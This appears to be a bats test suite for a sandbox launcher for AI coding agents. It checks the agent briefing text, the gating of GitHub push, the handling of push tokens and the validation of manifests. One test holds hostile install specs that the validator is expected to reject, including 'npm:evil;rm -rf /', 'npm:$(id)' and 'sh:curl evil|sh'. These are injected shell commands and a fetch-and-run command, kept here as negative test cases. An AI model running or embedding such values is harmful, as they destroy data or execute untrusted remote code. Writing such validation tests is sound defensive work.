# The negative half: a workflow that does not use worktrees has no reason to
# carry the paragraph, and its presence there would mean the splice is
# unconditional rather than opt-in.
@test "a workflow without worktrees does not carry the worktree paragraph" {
    [ "$(lib manifest_get workflow local-only requires_worktree)" = "off" ]
    run lib briefing_compose none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"does not isolate"* ]]
    [[ "$output" != *"worktree MUST live"* ]]
}

# The default that blocks GitHub push exists to stop an eager agent pushing to
# somebody else's project. When the operator lifts it, the agent gains the
# ability without the reason, so the briefing supplies the reason.
@test "the briefing warns against pushing elsewhere when GitHub push is on" {
    DEJIMA_GITHUB_PUSH=on run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"GitHub push is enabled for this session"* ]]
    [[ "$output" == *"pointed at and nothing else"* ]]
    [[ "$output" == *"not a contribution"* ]]
    # and it says what to do instead of nothing at all
    [[ "$output" == *"say so in your reply"* ]]
}

# Two points from docs/responsible-use.md that an agent can act on, as
# opposed to the majority which are the operator's to follow. Kept short on
# purpose: this text is in every session's context, for every user.
@test "the briefing names the two responsible-use points an agent can act on" {
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # a domain that acts on the world rather than serving data
    [[ "$output" == *"action rather than a source"* ]]
    [[ "$output" == *"let the operator decide"* ]]
    # and things in the working tree that are not code
    [[ "$output" == *"not"*"code"* ]]
    [[ "$output" == *".env"* ]]
}

@test "the briefing says nothing about GitHub push when it is off" {
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"GitHub push is enabled"* ]]
}

@test "bin/dejima turns the GitHub push briefing on for both routes to it" {
    # --allow-github-push, and forge = github under a pushing workflow.
    grep -q 'DEJIMA_GITHUB_PUSH=on' "$REPO_ROOT/bin/dejima"
    grep -q 'ALLOW_GITHUB_PUSH_FLAG" = 1 \]; then' "$REPO_ROOT/bin/dejima"
    grep -q 'hosts_allowlisted_by_core" ) \?= "on"\|hosts_allowlisted_by_core)" = "on"' "$REPO_ROOT/bin/dejima"
    grep -q 'export DEJIMA_GITHUB_PUSH' "$REPO_ROOT/bin/dejima"
}

@test "local-only pushes nothing and blocks no branches" {
    run lib manifest_validate workflow local-only
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(lib manifest_get workflow local-only push)" = "off" ]
    [ "$(lib manifest_get workflow local-only block_merge)" = "off" ]
    [ "$(lib manifest_get workflow local-only requires_worktree)" = "off" ]
    [ "$(lib manifest_get workflow local-only autonomy)" = "commit" ]
    # blocked_branches is empty BECAUSE push is off - there is no push to
    # block. This pins the pair together: turning push on later without
    # revisiting this would silently allow a push to main.
    [ -z "$(lib manifest_get workflow local-only blocked_branches)" ]
}

@test "none + local-only is a valid, fully unconfigured selection" {
    run lib provider_validate_selection none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ -z "$output" ]
}

@test "the github forge pushes with its own token, not the read-only one" {
    run lib manifest_validate forge github
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(lib manifest_get forge github capabilities)" = "pr issues" ]
    [ "$(lib manifest_get forge github pr_command)" = "gh pr" ]
    [ "$(lib manifest_get forge github merge_block)" = "gh pr merge" ]
    # The write-capable token is its own key. Reusing [github] token_file
    # would promote a deliberately read-only PAT to a pushing credential.
    [ "$(lib manifest_get forge github requires)" = "push_token_file" ]
    [[ "$(lib manifest_get forge github env_export)" == *"GH_TOKEN=@push_token_file"* ]]
    # Ships no CLI: gh is already in the image.
    [ -z "$(lib manifest_get forge github install)" ]
}

@test "the briefing does not call GitHub read-only when the forge can push to it" {
    # The other half of Task 2's network_allowlist resolver, tested here
    # because this is where the github forge starts existing.
    printf '[forge.github]\npush_token_file = /dev/null\n' > "$CONFIG_DIR/config"
    run lib briefing_compose github branch-push claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"GitHub read-only"* ]]
    [[ "$output" == *"GitHub, which this session can also push to"* ]]
}

@test "the github forge contributes its hosts without any config" {
    hosts="$(lib forge_hosts github)"
    for h in github.com ssh.github.com api.github.com; do
        [[ " $hosts " == *" $h "* ]] || { echo "missing $h in: $hosts"; return 1; }
    done
}

@test "the github forge routes its hosts through core's allowlist, not the extra-domains one" {
    # The manifest half of the launcher behaviour asserted in test/config.bats
    # ("the github forge's hosts never reach the extra-domains allowlist").
    # Those three hosts are public SaaS names already covered by core's
    # GitHub ranges: sending them down the extra-domains path would put them
    # in the port-unrestricted allowed-domains ipset AND exempt them from
    # dnsmasq's stop-dns-rebind, and the firewall's startup self-check
    # ("github.com:22 was reachable without ALLOW_GITHUB_PUSH=1") would then
    # refuse to bring the container up at all.
    [ "$(lib manifest_get forge github hosts_allowlisted_by_core)" = "on" ]
    # Still resolved by forge_hosts, which is what keeps rule 3 (a pushing
    # workflow needs a forge with a host) satisfied and what fills
    # DEJIMA_PUSH_HOSTS so git-push-guard.sh permits the push.
    [ -n "$(lib forge_hosts github)" ]
    # Off unless a manifest says otherwise: a self-hosted forge's host is
    # exactly the internal address the extra-domains path exists for.
    [ "$(lib manifest_get forge gitea hosts_allowlisted_by_core)" = "off" ]
    [ "$(lib manifest_get forge none hosts_allowlisted_by_core)" = "off" ]
}

@test "the network-posture sentence follows the manifest, not the forge's name" {
    # Same key, read for the briefing: with a pushing workflow the session
    # really can push to GitHub, and with a non-pushing one it really cannot
    # (bin/dejima only opens the push grant when the workflow pushes), so the
    # sentence has to say two different things for the same forge.
    printf '[forge.github]\npush_token_file = /dev/null\n' > "$CONFIG_DIR/config"
    run lib briefing_compose github local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"GitHub read-only"* ]]
    [[ "$output" != *"can also push to"* ]]
    # And no dangling "the configured github host" - core allowlists those,
    # there is nothing for an operator to have configured.
    [[ "$output" != *"configured github host"* ]]
}

@test "a required key that is set but empty counts as missing" {
    # install.sh writes every key commented out at its default, so
    # uncommenting one and not filling it in yields `api =` - set, and worth
    # nothing. config_is_set alone called that configured, and the launch
    # went ahead with every gitea call failing inside the container instead.
    printf '[forge.gitea]\nssh_host = git.example\napi =\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"api"* ]]
}

@test "a single required key that is set but empty is refused too" {
    # The same hole in the other rule: github's one `requires` key can never
    # be "partly" configured, so an empty push_token_file would otherwise
    # sail past both this rule and rule 3 (fixed_hosts means it always
    # resolves to a host) and launch with no push credential at all.
    printf '[core]\nforge = github\n[forge.github]\npush_token_file =\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection github branch-push claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"push_token_file"* ]]
}

@test "the no-host refusal offers the forge that needs no host configured" {
    # The remedy has to include the one an operator who wants to push would
    # actually pick - pointing only at `forge = none` + local-only answers
    # the opposite question. Asserted here as the claim (every forge the
    # remedy names is real), not the literal wording - see
    # assert_remedy_forges_exist.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    assert_remedy_forges_exist "$output"
    run lib provider_validate_selection none branch-push claude-code
    [ "$status" -ne 0 ]
    assert_remedy_forges_exist "$output"
}

@test "an unset push_token_file yields no GH_TOKEN pair at all, not an empty one" {
    # docker-compose.yml declares GH_TOKEN itself, carrying the independent
    # read-only [github] token_file value. `-e GH_TOKEN=` (the pair
    # forge_env_exports used to emit for an unresolved value) overrides that
    # entry to empty on `docker compose run` - wholly unconfigured must stay
    # silent here, exactly like it already does for provider_validate_selection's
    # own partial-config warning, or selecting this forge with no push token
    # yet silently voids the baseline read-only access every session gets.
    printf '[core]\nforge = github\n' > "$CONFIG_DIR/config"
    run lib forge_env_exports github
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ -z "$output" ]
}

@test "a configured push_token_file still yields a real GH_TOKEN pair" {
    tok="$CONFIG_DIR/push-token"
    printf 'ghp_example\n' > "$tok"
    printf '[forge.github]\npush_token_file = %s\n' "$tok" > "$CONFIG_DIR/config"
    run lib forge_env_exports github
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$output" = "GH_TOKEN=ghp_example" ]
}

@test "open-pr autonomy is refused against a forge with no pr capability" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/nopr" "$FAKE_ROOT/workflows/wants-pr" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities =\n' > "$FAKE_ROOT/forges/nopr/forge.conf"
    # requires is empty, so rule 1 passes and only the autonomy rule can catch this.
    printf 'requires =\npush = on\nautonomy = open-pr\n' > "$FAKE_ROOT/workflows/wants-pr/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection nopr wants-pr h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"open-pr"* ]]
}

@test "push-branch autonomy is refused when the workflow does not push" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/contradiction" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities =\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires =\npush = off\nautonomy = push-branch\n' > "$FAKE_ROOT/workflows/contradiction/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection f contradiction h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"push-branch"* ]]
}

@test "every shipped workflow's autonomy is supported by a forge that ships" {
    # worktree-pr/open-pr and branch-push both push, so both now need a real
    # host (rule 3) - gitea, fully configured. local-only never pushes, so
    # none (nothing configured at all) stays the honest pairing for it.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "gitea+worktree-pr: $output"; return 1; }
    run lib provider_validate_selection gitea branch-push claude-code
    [ "$status" -eq 0 ] || { echo "gitea+branch-push: $output"; return 1; }
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection none local-only claude-code
    [ "$status" -eq 0 ] || { echo "none+local-only: $output"; return 1; }
}

# The base image carries no harness, so `install` is what puts the selected one
# there. It reaches a Dockerfile RUN line built on the host, which is why it is
# a dependency spec rather than free text.
@test "a harness install spec is validated as a dependency spec" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/h"
    local bad
    for bad in 'npm:evil;rm -rf /' 'npm:$(id)' 'sh:curl evil|sh' 'npm:a b' \
               'tarball:x@notasha:https://e.example/x.tar' 'npm:'; do
        printf 'command = h\ninstall = %s\n' "$bad" > "$FAKE_ROOT/harnesses/h/harness.conf"
        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
        [ "$status" -ne 0 ] || { echo "accepted install spec: $bad"; return 1; }
    done
}

@test "a harness install spec that is a real dependency spec is accepted" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/h"
    local good
    for good in 'npm:@anthropic-ai/claude-code' 'npm:opencode-ai' 'apt:some-agent' \
                'npm:pkg@1.2.3'; do
        printf 'command = h\ninstall = %s\n' "$good" > "$FAKE_ROOT/harnesses/h/harness.conf"
        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
        [ "$status" -eq 0 ] || { echo "refused install spec: $good ($output)"; return 1; }
    done
}

@test "every shipped harness says how it gets into the image" {
    # An empty install means "already in the base image", which is only true of
    # something the base installs for another reason. A harness that declares
    # neither is one whose launch fails with an exec error inside a container.
    local d name spec
    for d in "$REPO_ROOT"/harnesses/*/; do
        [ -d "$d" ] || continue
        name="$(basename "$d")"
        spec="$(lib manifest_get harness "$name" install)"
        [ -n "$spec" ] || { echo "$name declares no install and is not in the base image"; return 1; }
    done
}
